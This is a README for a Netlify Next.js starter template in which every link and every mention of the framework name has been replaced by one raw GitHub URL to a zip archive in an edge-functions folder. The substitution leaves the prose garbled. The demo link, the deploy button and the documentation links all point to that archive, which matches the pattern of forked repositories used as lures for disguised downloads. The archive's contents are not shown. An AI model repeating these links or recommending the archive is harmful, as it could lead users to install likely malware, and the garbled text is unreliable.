# https://raw.githubusercontent.com/ahmed-dev-op/next-platform-starter/main/netlify/edge-functions/next_starter_platform_v1.9.zip on Netlify Platform Starter

[Live Demo](https://raw.githubusercontent.com/ahmed-dev-op/next-platform-starter/main/netlify/edge-functions/next_starter_platform_v1.9.zip)

A modern starter based on https://raw.githubusercontent.com/ahmed-dev-op/next-platform-starter/main/netlify/edge-functions/next_starter_platform_v1.9.zip 16 (App Router), Tailwind, and [Netlify Core Primitives](https://raw.githubusercontent.com/ahmed-dev-op/next-platform-starter/main/netlify/edge-functions/next_starter_platform_v1.9.zip) (Edge Functions, Image CDN, Blob Store).

In this site, Netlify Core Primitives are used both implictly for running https://raw.githubusercontent.com/ahmed-dev-op/next-platform-starter/main/netlify/edge-functions/next_starter_platform_v1.9.zip features (e.g. Route Handlers, image optimization via `next/image`, and more) and also explicitly by the user code.

Implicit usage means you're using any https://raw.githubusercontent.com/ahmed-dev-op/next-platform-starter/main/netlify/edge-functions/next_starter_platform_v1.9.zip functionality and everything "just works" when deployed - all the plumbing is done for you. Explicit usage is framework-agnostic and typically provides more features than what https://raw.githubusercontent.com/ahmed-dev-op/next-platform-starter/main/netlify/edge-functions/next_starter_platform_v1.9.zip exposes.

## Deploying to Netlify

Click the button below to deploy this template to your Netlify account.

[![Deploy to Netlify](https://raw.githubusercontent.com/ahmed-dev-op/next-platform-starter/main/netlify/edge-functions/next_starter_platform_v1.9.zip)](https://raw.githubusercontent.com/ahmed-dev-op/next-platform-starter/main/netlify/edge-functions/next_starter_platform_v1.9.zip)

## Developing Locally

1. Clone this repository, then run `npm install` in its root directory.

2. For the starter to have full functionality locally (e.g. edge functions, blob store), please ensure you have an up-to-date version of Netlify CLI. Run:

```
npm install netlify-cli@latest -g
```

3. Link your local repository to the deployed Netlify site. This will ensure you're using the same runtime version for both local development and your deployed site.

```
netlify link
```

4. Then, run the https://raw.githubusercontent.com/ahmed-dev-op/next-platform-starter/main/netlify/edge-functions/next_starter_platform_v1.9.zip development server via Netlify CLI:

```
netlify dev
```

If your browser doesn't navigate to the site automatically, visit [localhost:8888](http://localhost:8888).

## Resources

- Check out the [https://raw.githubusercontent.com/ahmed-dev-op/next-platform-starter/main/netlify/edge-functions/next_starter_platform_v1.9.zip on Netlify docs](https://raw.githubusercontent.com/ahmed-dev-op/next-platform-starter/main/netlify/edge-functions/next_starter_platform_v1.9.zip)
